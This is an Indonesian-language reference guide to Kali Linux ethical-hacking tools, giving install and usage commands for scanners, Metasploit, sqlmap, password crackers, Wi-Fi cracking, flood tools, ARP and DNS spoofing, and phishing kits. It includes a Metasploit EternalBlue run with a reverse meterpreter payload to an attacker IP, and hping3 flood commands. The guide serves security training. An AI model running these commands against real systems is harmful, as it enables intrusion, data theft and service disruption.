# Dokumentasi Tools Ethical Hacking

## Panduan Mengakses Bantuan dan Dokumentasi

### Mendapatkan Bantuan di Terminal
1. Manual Pages (man)
   ```bash
   # Melihat manual page tool
   man nmap
   man wireshark
   man metasploit
   
   # Mencari manual page berdasarkan keyword
   man -k password
   man -k network
   ```

2. Help Option
   ```bash
   # Opsi bantuan singkat
   tool_name -h
   tool_name --help
   
   # Contoh:
   nmap -h
   sqlmap --help
   ```

3. Info Pages
   ```bash
   # Informasi detail tentang tool
   info nmap
   info wireshark
   ```

### Dokumentasi Online
1. Official Documentation
   - Kali Linux Tools: https://www.kali.org/tools/
   - Tool-specific docs: https://tools.kali.org/
   - Git repositories: https://gitlab.com/kalilinux/

2. Community Resources
   - Kali Forums: https://forums.kali.org/
   - Documentation Wiki: https://www.kali.org/docs/
   - Tool Tutorials: https://www.kali.org/tutorials/

### Tips Menggunakan Dokumentasi
1. Perintah Dasar
   ```bash
   # Versi tool
   tool_name --version
   
   # Melihat opsi tersedia
   tool_name --help | less
   
   # Mencari opsi spesifik
   tool_name --help | grep pattern
   ```

2. Dokumentasi Lokal
   ```bash
   # Lokasi dokumentasi
   cd /usr/share/doc/tool_name
   
   # Contoh file dokumentasi
   cat README.md
   less CHANGELOG
   ```

3. Mengakses Examples
   ```bash
   # Contoh penggunaan
   cd /usr/share/tool_name/examples
   
   # Documentation files
   ls /usr/share/doc/tool_name/examples
   ```

### Troubleshooting
1. Common Error Messages
   ```bash
   # Check status
   systemctl status service_name
   
   # View logs
   tail -f /var/log/tool_name.log
   
   # Debug mode
   tool_name --debug
   ```

2. Community Support
   - Stack Overflow
   - GitHub Issues
   - Tool-specific forums
   - Kali Linux forums

### Keeping Updated
1. Update Documentation
   ```bash
   # Update package information
   sudo apt update
   
   # Update tools
   sudo apt upgrade
   
   # Update specific tool docs
   sudo apt install --reinstall tool_name-doc
   ```

2. Version Check
   ```bash
   # Check installed version
   dpkg -l | grep tool_name
   
   # Check available version
   apt-cache policy tool_name
   ```

---

## 1. Information Gathering Tools

### Nmap (Network Mapper)
#### Deskripsi
Nmap adalah tool scanning jaringan yang powerful untuk discovery host dan service pada jaringan komputer.

#### Bantuan dan Dokumentasi
```bash
# Manual page
man nmap

# Quick help
nmap -h

# Version info
nmap --version

# Online docs
xdg-open https://nmap.org/book/

# Examples directory
ls /usr/share/nmap/scripts/
```

#### Instalasi
```bash
sudo apt install nmap
```

#### Penggunaan Dasar
```bash
# Basic scan
nmap target

# Scan specific ports
nmap -p 80,443 target

# Service version detection
nmap -sV target

# OS detection
nmap -O target

# Aggressive scan (OS detection, version detection, script scanning, and traceroute)
nmap -A target

# Stealth scan using SYN packets
nmap -sS target

# Full port scan
nmap -p- target

# Script scan
nmap --script=vuln target
```

### Maltego
#### Deskripsi
Tool OSINT yang powerful untuk mengumpulkan dan menganalisis informasi dari berbagai sumber.

#### Bantuan dan Dokumentasi
```bash
# Manual page
man maltego

# Help menu (dalam GUI)
Menu > Help > Documentation

# Online docs
xdg-open https://docs.maltego.com/

# Local docs
ls /usr/share/doc/maltego/
```

#### Instalasi
```bash
sudo apt install maltego
```

#### Penggunaan
1. Buka Maltego
2. Create new graph
3. Drag entities ke graph
4. Run transforms
5. Analyze relationships

### theHarvester
#### Deskripsi
Tool untuk mengumpulkan email, subdomain, host, employee names, dan ports dari berbagai sumber publik.

#### Bantuan dan Dokumentasi
```bash
# Show help
theHarvester -h

# List available data sources
theHarvester -l

# Online docs
xdg-open https://github.com/laramies/theHarvester/wiki/

# Examples
theHarvester --help | grep "Example:"
```

#### Instalasi
```bash
sudo apt install theharvester
```

#### Penggunaan
```bash
# Basic search
theHarvester -d domain.com -b all

# Specific source search
theHarvester -d domain.com -b google

# Email search
theHarvester -d domain.com -b linkedin -l 500
```

## 2. Vulnerability Assessment Tools

### OpenVAS
#### Deskripsi
Framework vulnerability scanning yang komprehensif.

#### Bantuan dan Dokumentasi
```bash
# Check service status
gvm-check-setup

# CLI help
gvm-cli --help

# Online docs
xdg-open https://docs.greenbone.net/

# View logs
tail -f /var/log/gvm/gvmd.log
```

#### Instalasi
```bash
sudo apt install openvas
sudo gvm-setup
```

#### Penggunaan
1. Akses web interface (https://localhost:9392)
2. Create new target
3. Create new task
4. Run scan
5. Analyze results

### Nessus
#### Deskripsi
Vulnerability scanner profesional dengan berbagai capabilities.

#### Instalasi
1. Download dari website Tenable
2. Install package:
```bash
sudo dpkg -i Nessus-*.deb
sudo systemctl start nessusd
```

#### Penggunaan
1. Akses web interface (https://localhost:8834)
2. Configure scan
3. Run assessment
4. Generate report

## 3. Web Application Testing Tools

### Burp Suite
#### Deskripsi
Platform terintegrasi untuk security testing aplikasi web.

#### Bantuan dan Dokumentasi
```bash
# Launch with help
burpsuite --help

# Built-in help (dalam GUI)
Menu > Help > Documentation

# Support portal
xdg-open https://portswigger.net/burp/documentation

# Local examples
ls /usr/share/doc/burpsuite/examples/
```

#### Instalasi
```bash
sudo apt install burpsuite
```

#### Fitur Utama
1. Proxy
   ```plaintext
   - Configure browser proxy (127.0.0.1:8080)
   - Intercept requests
   - Modify parameters
   ```

2. Scanner
   ```plaintext
   - Automated scanning
   - Vulnerability detection
   - Custom scan configurations
   ```

3. Intruder
   ```plaintext
   - Brute force attacks
   - Payload configuration
   - Attack patterns
   ```

### OWASP ZAP
#### Deskripsi
Tool open source untuk finding vulnerabilities dalam aplikasi web.

#### Instalasi
```bash
sudo apt install zaproxy
```

#### Penggunaan
```bash
# Quick scan
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://target

# Full scan
zap-cli full-scan --self-contained --start-options '-config api.disablekey=true' http://target
```

## 4. Exploitation Tools

### Metasploit Framework
#### Deskripsi
Framework untuk developing, testing, dan executing exploit code.

#### Bantuan dan Dokumentasi
```bash
# Framework help
msfconsole -h

# Inside msfconsole:
help
help commands
help advanced
help exploit

# Search help
search -h

# Module documentation
info <module_name>

# Online docs
xdg-open https://docs.metasploit.com/

# Local docs
ls /usr/share/metasploit-framework/documentation/
```

#### Instalasi
```bash
sudo apt install metasploit-framework
```

#### Penggunaan Dasar
```bash
# Start Metasploit
msfconsole

# Search for exploits
search type:exploit platform:windows

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS target
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip

# Run exploit
exploit
```

### SQLmap
#### Deskripsi
Tool automated untuk detecting dan exploiting SQL injection vulnerabilities.

#### Bantuan dan Dokumentasi
```bash
# Basic help
sqlmap -h

# Advanced help
sqlmap -hh

# Show version
sqlmap --version

# List tampers
sqlmap --list-tampers

# Online docs
xdg-open https://github.com/sqlmapproject/sqlmap/wiki

# Local examples
ls /usr/share/doc/sqlmap/examples/
```

#### Instalasi
```bash
sudo apt install sqlmap
```

#### Penggunaan
```bash
# Basic scan
sqlmap -u "http://target/page.php?id=1"

# Database enumeration
sqlmap -u "http://target/page.php?id=1" --dbs

# Table enumeration
sqlmap -u "http://target/page.php?id=1" -D database --tables

# Dump data
sqlmap -u "http://target/page.php?id=1" -D database -T table --dump
```

## 5. Wireless Testing Tools

### Aircrack-ng
#### Deskripsi
Suite tools untuk assessing WiFi network security.

#### Bantuan dan Dokumentasi
```bash
# General help
aircrack-ng --help

# Specific tool help
airodump-ng --help
aireplay-ng --help
airmon-ng --help

# Check dependencies
aircrack-ng-bat

# Online docs
xdg-open https://www.aircrack-ng.org/documentation.html

# Local docs
ls /usr/share/doc/aircrack-ng/
```

#### Instalasi
```bash
sudo apt install aircrack-ng
```

#### Penggunaan
```bash
# Start monitor mode
airmon-ng start wlan0

# Capture packets
airodump-ng wlan0mon

# Target specific network
airodump-ng -c [channel] --bssid [MAC] -w output wlan0mon

# Crack WPA handshake
aircrack-ng -w wordlist.txt output*.cap
```

## 6. Password Attacks

### John the Ripper
#### Deskripsi
Tool password cracking yang fast dan flexible.

#### Bantuan dan Dokumentasi
```bash
# Show options
john --help

# Show supported hash types
john --list=formats

# Show config info
john --list=build-info

# Online docs
xdg-open https://www.openwall.com/john/doc/

# Local config examples
ls /etc/john/
```

#### Instalasi
```bash
sudo apt install john
```

#### Penggunaan
```bash
# Basic crack
john hash.txt

# Using wordlist
john --wordlist=wordlist.txt hash.txt

# Show cracked passwords
john --show hash.txt
```

### Hashcat
#### Deskripsi
Advanced password recovery tool.

#### Instalasi
```bash
sudo apt install hashcat
```

#### Penggunaan
```bash
# Basic attack
hashcat -m 0 hash.txt wordlist.txt

# Dictionary attack with rules
hashcat -m 0 hash.txt wordlist.txt -r rules/best64.rule

# Brute force attack
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a
```

## 7. Forensics Tools

### Volatility
#### Deskripsi
Framework untuk memory forensics.

#### Instalasi
```bash
sudo apt install volatility
```

#### Penggunaan
```bash
# Image info
volatility -f memory.dump imageinfo

# Process listing
volatility -f memory.dump --profile=Win7SP1x64 pslist

# Network connections
volatility -f memory.dump --profile=Win7SP1x64 netscan
```

### Autopsy
#### Deskripsi
Digital forensics platform.

#### Instalasi
```bash
sudo apt install autopsy
```

#### Penggunaan
1. Start Autopsy
2. Create New Case
3. Add Data Source
4. Analyze Evidence
5. Generate Report

## 8. Web Application Analysis Tools

### Nikto
#### Deskripsi
Web server scanner yang menguji web servers untuk item dan konfigurasi berbahaya.

#### Instalasi
```bash
sudo apt install nikto
```

#### Penggunaan
```bash
# Basic scan
nikto -h target

# Tuning options scan
nikto -h target -Tuning 123bde

# SSL scan
nikto -h target -ssl

# Save output
nikto -h target -o report.html -Format htm
```

### WPScan
#### Deskripsi
Black box security scanner untuk WordPress.

#### Instalasi
```bash
sudo apt install wpscan
```

#### Penggunaan
```bash
# Basic scan
wpscan --url http://target

# Enumerate users
wpscan --url http://target --enumerate u

# Enumerate plugins
wpscan --url http://target --enumerate p

# Password attack
wpscan --url http://target --passwords wordlist.txt
```

### Dirb
#### Deskripsi
Web content scanner yang mencari direktori dan file tersembunyi.

#### Instalasi
```bash
sudo apt install dirb
```

#### Penggunaan
```bash
# Basic scan
dirb http://target

# Custom wordlist
dirb http://target /path/to/wordlist.txt

# Save output
dirb http://target -o output.txt
```

## 9. Network Analysis Tools

### Wireshark
#### Deskripsi
Network protocol analyzer untuk analisis paket jaringan real-time.

#### Bantuan dan Dokumentasi
```bash
# CLI help
wireshark -h
tshark -h

# Manual pages
man wireshark
man tshark

# Built-in help (dalam GUI)
Menu > Help > Contents
Menu > Help > Manual Pages

# Online docs
xdg-open https://www.wireshark.org/docs/

# Local docs
ls /usr/share/doc/wireshark/
```

#### Instalasi
```bash
sudo apt install wireshark
```

#### Penggunaan
1. Capture Filter Examples:
```plaintext
host 192.168.1.1
port 80
tcp port 443
!arp
```

2. Display Filter Examples:
```plaintext
http
tcp.port == 80
ip.addr == 192.168.1.1
http.request.method == "POST"
```

### Tcpdump
#### Deskripsi
Command-line packet analyzer.

#### Instalasi
```bash
sudo apt install tcpdump
```

#### Penggunaan
```bash
# Capture traffic on interface
tcpdump -i eth0

# Capture specific host
tcpdump host 192.168.1.1

# Capture specific port
tcpdump port 80

# Save capture
tcpdump -w capture.pcap
```

## 10. Stress Testing Tools

### Hping3
#### Deskripsi
Network tool untuk generating paket TCP/IP.

#### Instalasi
```bash
sudo apt install hping3
```

#### Penggunaan
```bash
# TCP SYN flood
hping3 -S target -p 80 --flood

# ICMP flood
hping3 -1 target --flood

# UDP flood
hping3 -2 target -p 80 --flood
```

### Siege
#### Deskripsi
HTTP load testing dan benchmarking utility.

#### Instalasi
```bash
sudo apt install siege
```

#### Penggunaan
```bash
# Basic test
siege -c10 -t1M http://target

# Benchmark mode
siege -b -t60S http://target

# Read URLs from file
siege -f urls.txt
```

## 11. Sniffing & Spoofing Tools

### Ettercap
#### Deskripsi
Suite untuk man-in-the-middle attacks.

#### Instalasi
```bash
sudo apt install ettercap-graphical
```

#### Penggunaan
```bash
# Start GUI
ettercap -G

# Text mode scan
ettercap -T -M arp /target1/ /target2/

# DNS spoofing
ettercap -T -q -P dns_spoof
```

### Bettercap
#### Deskripsi
Swiss army knife untuk network attacks dan monitoring.

#### Instalasi
```bash
sudo apt install bettercap
```

#### Penggunaan
```bash
# Start bettercap
sudo bettercap

# Network recon
net.probe on
net.show

# ARP spoofing
set arp.spoof.targets target
arp.spoof on
```

## 12. Social Engineering Tools

### Social-Engineer Toolkit (SET)
#### Deskripsi
Framework untuk social engineering attacks.

#### Instalasi
```bash
sudo apt install set
```

#### Penggunaan
1. Start SET:
```bash
setoolkit
```

2. Common Attack Vectors:
- Spear-Phishing Attack
- Website Attack
- Infectious Media Generator
- Mass Mailer

### Gophish
#### Deskripsi
Open-source phishing toolkit.

#### Instalasi
```bash
# Download and extract
wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.x.x-linux-64bit.zip
unzip gophish-v0.x.x-linux-64bit.zip
```

#### Penggunaan
1. Start server
2. Access dashboard (https://localhost:3333)
3. Create campaign
4. Monitor results

## 13. Reporting Tools

### Dradis
#### Deskripsi
Collaboration and reporting platform untuk security assessments.

#### Instalasi
```bash
sudo apt install dradis
```

#### Penggunaan
1. Start service:
```bash
dradis start
```

2. Access web interface (http://localhost:3000)
3. Create project
4. Import findings
5. Generate report

### Faraday
#### Deskripsi
Integrated platform untuk pentest management.

#### Instalasi
```bash
sudo apt install faraday
```

#### Penggunaan
1. Start Faraday:
```bash
faraday-server
```

2. Access web interface
3. Create workspace
4. Import scan results
5. Generate reports

## Best Practices
1. Tool Usage
   - Selalu update tools ke versi terbaru
   - Backup konfigurasi penting
   - Test di lab environment dulu
   - Document semua findings

2. Security
   - Gunakan tools dalam isolated environment
   - Monitor resource usage
   - Encrypt sensitive data
   - Follow security policies

3. Documentation
   - Keep detailed logs
   - Document configurations
   - Record findings
   - Maintain reports

## Troubleshooting
1. Common Issues
   - Permission errors
   - Dependencies problems
   - Network connectivity
   - Resource limitations

2. Solutions
   - Check permissions
   - Update dependencies
   - Verify network settings
   - Monitor resource usage

*Note: Gunakan tools ini hanya untuk ethical hacking dan dengan izin yang tepat.*